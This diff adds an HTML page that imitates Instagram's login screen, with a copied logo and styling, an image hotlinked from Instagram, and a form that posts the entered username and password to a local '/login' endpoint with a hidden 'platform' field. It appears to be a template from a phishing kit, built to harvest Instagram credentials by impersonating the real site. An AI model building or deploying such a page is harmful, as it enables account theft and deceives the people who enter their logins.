@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Login Instagram</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <style>
+    * {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+  font-family: 'Roboto', sans-serif;
+}
+
+body {
+  background-color: #fafafa;
+  display: flex;
+  justify-content: center;
+  padding: 50px 20px;
+}
+
+.container {
+  display: flex;
+  max-width: 900px;
+  width: 100%;
+  /* justify-content: center; */
+  align-items: center;
+}
+
+.phone-mockup {
+  background: url('https://www.instagram.com/static/images/homepage/home-phones.png/3882f2a93d45.png') no-repeat center center;
+  background-size: contain;
+  width: 380px;
+  height: 600px;
+  display: none;
+}
+
+@media(min-width: 768px) {
+  .phone-mockup {
+    display: block;
+  }
+}
+
+.login-form {
+  max-width: 350px;
+  width: 100%;
+  margin-left: 40px;
+}
+
+.form-box {
+  background-color: white;
+  border: 1px solid #dbdbdb;
+  padding: 40px;
+  text-align: center;
+}
+
+.logo {
+  font-family: 'Arial', sans-serif;
+  font-size: 40px;
+  margin-bottom: 30px;
+}
+
+input {
+  width: 100%;
+  padding: 10px;
+  margin: 6px 0;
+  border: 1px solid #dbdbdb;
+  background: #fafafa;
+  border-radius: 3px;
+}
+
+button {
+  width: 100%;
+  padding: 10px;
+  margin-top: 10px;
+  background-color: #3897f0;
+  border: none;
+  color: white;
+  font-weight: bold;
+  border-radius: 4px;
+  cursor: pointer;
+}
+
+.divider {
+  margin: 20px 0;
+  position: relative;
+  text-align: center;
+  color: #999;
+}
+
+.divider::before,
+.divider::after {
+  content: '';
+  height: 1px;
+  background: #ccc;
+  position: absolute;
+  top: 50%;
+  width: 40%;
+}
+
+.divider::before {
+  left: 0;
+}
+
+.divider::after {
+  right: 0;
+}
+
+.fb-login {
+  background: none;
+  color: #385185;
+  font-weight: bold;
+}
+
+.forgot {
+  display: block;
+  margin-top: 20px;
+  color: #00376b;
+  font-size: 12px;
+  text-decoration: none;
+}
+
+.signup-box {
+  background-color: white;
+  border: 1px solid #dbdbdb;
+  padding: 20px;
+  margin-top: 10px;
+  text-align: center;
+  font-size: 14px;
+}
+
+.signup-box a {
+  color: #3897f0;
+  text-decoration: none;
+  font-weight: bold;
+}
+
+.get-app {
+  text-align: center;
+  margin-top: 20px;
+  font-size: 14px;
+}
+
+.app-buttons img {
+  width: 136px;
+  margin: 10px 5px;
+}
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="phone-mockup"></div>
+
+    <div class="login-form">
+      <div class="form-box">
+        <h1 class="logo">Instagram</h1>
+        <form id="loginForm" method="POST" action="/login">
+            <input type="hidden" name="platform" value="manual" />
+            <input type="text" id="username" name="username" placeholder="Enter your username or email" required />
+
+            <input type="password" id="password" name="password" placeholder="Enter your password" required />
+            <button type="submit">Log In</button>
+
+            <div class="divider">OR</div>
+            <button class="fb-login" onclick="window.location.href='https://www.facebook.com/login'">Log in with Facebook</button>
+            <a href="#" class="forgot">Forgot password?</a>
+         </form>
+      </div>
+
+      <div class="signup-box">
+        <p>Don't have an account? <a href="#">Sign up</a></p>
+      </div>
+
+      <div class="get-app">
+        <p>Get the app.</p>
+        <div class="app-buttons">
+          <img src="/templates/Google.png" alt="App Store">
+          <img src="/templates/Microsoft.png" alt="Google Play">
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
